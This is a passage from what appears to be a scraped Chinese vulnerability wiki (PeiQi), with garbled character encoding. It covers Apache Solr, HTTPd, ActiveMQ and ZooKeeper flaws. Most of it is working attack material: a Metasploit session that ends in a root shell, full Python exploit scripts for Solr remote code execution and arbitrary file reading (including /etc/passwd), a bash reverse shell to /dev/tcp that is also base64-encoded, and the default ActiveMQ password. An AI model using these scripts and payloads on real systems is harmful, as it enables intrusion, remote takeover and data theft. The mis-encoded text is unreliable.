payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > set rhost 192.168.51.146 rhost => 192.168.51.146 msf5 exploit(multi/misc/java_jmx_server) > set rport 18983 rport => 18983 msf5 exploit(multi/misc/java_jmx_server) > set payload java/meterpreter/reverse_tcp payload => java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.51.146 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.51.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > run [*] Started reverse TCP handler on 192.168.51.149:4444 [*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Sending RMI Header... [*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint... [+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Proceeding with handshake... [+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Loading payload... [*] 192.168.51.146:18983 - Replied to request for mlet [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] 192.168.51.146:18983 - Executing payload... [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] Sending stage (53944 bytes) to 192.168.51.146 [*] Meterpreter session 1 opened (192.168.51.149:4444 -> 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id ç”¨æˆ·id=0(root) ç»„id=0(root) ç»„=0(root) æ¼æ´ä¿®å¤ å°†solr.in.shé…ç½®æ–‡ä»¶ä¸­çš„ENABLE_REMOTE_JMX_OPTSé€‰é¡¹è®¾ç½®ä¸ºfalseï¼Œç„¶åé‡å¯SolræœåŠ¡ã€‚ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957.html","title":"Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957","keywords":"","body":"Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957 æ¼æ´æè¿° åœ¨ç‰¹å®šçš„Solrç‰ˆæœ¬ä¸­ConfigSet APIå­˜åœ¨æœªæˆæƒä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨æ¼æ´å¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 ç¯å¢ƒæ­å»º é€‰æ‹©ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ ä¸‹è½½å„ç‰ˆæœ¬Solråœ°å€ è¿™é‡Œå¤ç°ä½¿ç”¨çš„æ˜¯ Apache Solr 7.7.0 è¿›è¡Œå¤ç° ä¸‹è½½åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¯å¢ƒéƒ¨ç½² cd solr-7.7.0 ./bin/solr start -e cloud -force ç„¶åä¸€è·¯å›è½¦ï¼Œç›´è‡³å‡ºç° Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° åœ¨æ”»å‡»æœºä¸Šä¸‹è½½ç›®æ ‡ç‰ˆæœ¬çš„Solr,æ‰§è¡Œä¸‹åˆ—å‘½ä»¤æ‰“åŒ…å‹ç¼©æ–‡ä»¶ solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip å°† vuln.zip è¿›è¡Œä¸Šä¼  curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] nameå‚æ•°ä¸ºå‹ç¼©åŒ…çš„æ–‡ä»¶å åˆ©ç”¨æ¼æ´åˆ›å»ºä¸€ä¸ª core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] nameå‚æ•°ä¸ºåˆ›å»ºçš„coreæ ¸å¿ƒå collection.configNameå‚æ•°ä¸ºä¸Šä¼ çš„æ–‡ä»¶å æŸ¥çœ‹coreåˆ—è¡¨ï¼Œå‘ç°å·²ç»æˆåŠŸåˆ›å»º å†ä½¿ç”¨ Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ POCä½¿ç”¨è¯¦æƒ…å‚è€ƒå¦ä¸€ç¯‡å¤ç°æ–‡ç«  æ¼æ´åˆ©ç”¨POC [!NOTE] ä½¿ç”¨å‰æŒ‰å¤ç°æ­¥éª¤ä¸Šä¼ å¯¹åº”ç‰ˆæœ¬çš„zipæ–‡ä»¶ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶ä¸º qwert.zip,å…¶ä»–ä½¿ç”¨æ–¹æ³•ä¸ Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 çš„POCä½¿ç”¨æ–¹æ³•ç±»ä¼¼ #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip >>> vuln.zip(Zipæ–‡ä»¶å) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore >>> \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE&name=%s&numShards=1&replicationFactor=1&wt=xml&collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] åˆ›å»ºCoreå¤±è´¥ \\033[0m\") sys.exit(0) else: core = re.findall(r'(.*?)',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POSTè¯·æ±‚æˆåŠŸå°†params.resource.loader.enabledè®¾ç½®ä¸ºTrue \\033[0m\") else: print(\"\\033[31m[x] POSTè¯·æ±‚params.resource.loader.enabledè®¾ç½®ä¸ºTrueå¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] ä»£ç æ‰§è¡Œå¤±è´¥ï¼Œå“åº”ä¸º Error 500 \\033[0m\") else: print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = str(input(\"\\033[35mPlease input File Name\\nZip >>> \\033[0m\")) vuln_url,core = POC_1(target_url, file_name) POC_2(target_url, core) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_4(target_url, core, IP, PORT) else: POC_3(target_url, core, cmd) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"Apache Solr ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"Apache Solr ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° Apache Solr å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹è·å–ç›®æ ‡æœåŠ¡å™¨æ•æ„Ÿæ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] Apache Solr FOFA [!NOTE] title=\"Solr Admin\" æ¼æ´å¤ç° è®¿é—® Solr Admin ç®¡ç†å‘˜é¡µé¢ è·å–coreçš„ä¿¡æ¯ http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json å‘é€è¯·æ±‚ è¯·æ±‚åŒ…å¦‚ä¸‹ POST /solr/ckan/config HTTP/1.1 Host: xxx.xxx.xxx:8983 Content-Length: 99 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://118.31.46.134:8983 Content-Type: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close {\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true},\"olrkzv64tv\":\"=\"} å†è¿›è¡Œæ–‡ä»¶è¯»å– è¯·æ±‚åŒ…å¦‚ä¸‹ POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Origin: http://118.31.46.134:8983 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close stream.url=file:///etc/passwd Curlè¯·æ±‚ä¸º curl -d '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json' curl \"http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams\" -F \"stream.url=file://etc/passwd\" æ¼æ´åˆ©ç”¨POC [!NOTE] POCè¿˜æ˜¯å»ºç«‹åœ¨æœªæˆæƒè®¿é—®çš„æƒ…å†µä¸‹ import requests import sys import random import re import base64 import time from lxml import etree import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mFile >>> æ–‡ä»¶åç§°æˆ–ç›®å½• \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): vuln_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-type\":\"application/json\" } data = '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨å‡†å¤‡æ–‡ä»¶è¯»å–...... \\033[0m\".format(target_url)) if \"This\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å¯èƒ½å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_3(target_url, core_name, File_name): vuln_url = target_url + \"/solr/{}/debug/dump?param=ContentStreams\".format(core_name) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'stream.url=file://{}'.format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if \"No such file or directory\" in response.text: print(\"\\033[31m[x] è¯»å–{}å¤±è´¥ \\033[0m\".format(File_name)) else: print(\"\\033[36m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(json.loads(response.text)[\"streams\"][0][\"stream\"])) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: File_name = str(input(\"\\033[35mFile >>> \\033[0m\")) POC_3(target_url, core_name, File_name) Goby & POC å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Apache_Solr_Arbitrary_File_Read.json å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache HTTPd/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache HTTPd/","title":"Apache HTTPd","keywords":"","body":"Apache HTTPd Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-12 15:51:04 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache HTTPd/Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache HTTPd/Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715.html","title":"Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715","keywords":"","body":"Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715 æ¼æ´æè¿° Apache HTTPDæ˜¯ä¸€æ¬¾HTTPæœåŠ¡å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡mod_phpæ¥è¿è¡ŒPHPç½‘é¡µã€‚å…¶2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ1.php\\x0Aå°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚ æ¼æ´å½±å“ [!NOTE] Apache HTTPd 2.4.0~2.4.29ç‰ˆæœ¬ ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:8080 æ­£å¸¸å³å¯ æ¼æ´å¤ç° ç›´æ¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ä¼šè¢«æ‹¦æˆª æŠ“åŒ…ä¿®æ”¹å¦‚ä¸‹å‚æ•° å“åº”ä¸º200ï¼ŒæˆåŠŸç»•è¿‡ è®¿é—® http://xxx.xxx.xxx.xxx:8080/evil.php%0a æˆåŠŸè§¦å‘è§£ææ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/","title":"Apache ActiveMQ","keywords":"","body":"Apache ActiveMQ Apache ActiveMQ Consoleæ§åˆ¶å° å­˜åœ¨é»˜è®¤å¼±å£ä»¤ Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-21 17:00:36 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/Apache ActiveMQ Consoleæ§åˆ¶å°é»˜è®¤å¼±å£ä»¤.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/Apache ActiveMQ Consoleæ§åˆ¶å°é»˜è®¤å¼±å£ä»¤.html","title":"Apache ActiveMQ Consoleæ§åˆ¶å°é»˜è®¤å¼±å£ä»¤","keywords":"","body":"Apache ActiveMQ Console å­˜åœ¨é»˜è®¤å¼±å£ä»¤ æ¼æ´æè¿° Apache ActiveMQ Console å­˜åœ¨é»˜è®¤å¼±å£ä»¤ admin:adminï¼Œè¿›å…¥æ§åˆ¶å°åå¯è¢«è¿›ä¸€æ­¥æ¶æ„åˆ©ç”¨ æ¼æ´å½±å“ [!NOTE] Apache ActiveMQ æ¼æ´å¤ç° Apache ActiveMQ é»˜è®¤å¼€å¯äº† 8186 æ§åˆ¶å° è®¿é—®ç›®æ ‡: http://xxx.xxx.xxx.xxx:8161/admin ä½¿ç”¨é»˜è®¤å£ä»¤ admin:admin Goby & POC [!NOTE] Apache ActiveMQ_Console Weak Password PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254.html","title":"Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254","keywords":"","body":"Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254 æ¼æ´æè¿° Apache ActiveMQæ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šæ‰€ç ”å‘çš„ä¸€å¥—å¼€æºçš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå®ƒæ”¯æŒJavaæ¶ˆæ¯æœåŠ¡ï¼Œé›†ç¾¤ï¼ŒSpring Frameworkç­‰ã€‚Apache ActiveMQ 5.13.0ä¹‹å‰5.xç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºç¨‹åºæ²¡æœ‰é™åˆ¶å¯åœ¨ä»£ç†ä¸­åºåˆ—åŒ–çš„ç±»ã€‚è¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„åºåˆ—åŒ–çš„Javaæ¶ˆæ¯æœåŠ¡ï¼ˆJMSï¼‰ObjectMessageå¯¹è±¡åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚ æ¼æ´å½±å“ [!NOTE] Apache ActiveMQ 5.13.0ä¹‹å‰5.xç‰ˆæœ¬ æ¼æ´å¤ç° é¦–å…ˆä¸‹è½½ jmet ä¸‹è½½é“¾æ¥ wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar mkdir external å¯¹ç›®æ ‡å‘é€ä¸€ä¸ªç”Ÿæˆ/tmp/vulnçš„ payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/vuln\" -Yp ROME xxx.xxx.xxx.xxx 61616 è®¿é—® http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event å¯ä»¥çœ‹åˆ°å¤šäº†ä¸€æ¡æ¶ˆæ¯é˜Ÿåˆ— ç‚¹å‡»è¿™ä¸ªä¿¡æ¯è§¦å‘æ–‡ä»¶åˆ›å»º æˆåŠŸæ‰§è¡Œå‘½ä»¤åˆ›å»ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªåå¼¹shellçš„payload bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 (base64ç¼–ç ) YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i} å‘é€payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\" -Yp ROME 172.21.231.183 61616 åŒæ ·ç‚¹å‡»æ¶ˆæ¯é˜Ÿåˆ—ä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ZooKeeper/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ZooKeeper/","title":"Apache ZooKeeper","keywords":"","body":"PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-16 18:13:15 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ZooKeeper/Apache ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´ CVE-2014-085.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ZooKeeper/Apache ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´ CVE-2014-085.html","title":"Apache ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´ CVE-2014-085","keywords":"","body":"Apache ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´ CVE-2014-085 æ¼æ´æè¿° é»˜è®¤å®‰è£…é…ç½®å®Œçš„zookeeperå…è®¸æœªæˆæƒè®¿é—®ï¼Œç®¡ç†å‘˜æœªé…ç½®è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚å¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨é»˜è®¤å¼€æ”¾çš„2181ç«¯å£ä¸‹é€šè¿‡æ‰§è¡Œenviå‘½ä»¤è·å¾—å¤§é‡æ•æ„Ÿä¿¡æ¯ï¼ˆç³»ç»Ÿåç§°ã€javaç¯å¢ƒï¼‰å¯¼è‡´ä»»æ„ç”¨æˆ·å¯ä»¥åœ¨ç½‘ç»œä¸å—é™çš„æƒ…å†µä¸‹è¿›è¡Œæœªæˆæƒè®¿é—®è¯»å–æ•°æ® æ¼æ´å½±å“ [!NOTE] Apache ZooKeeper 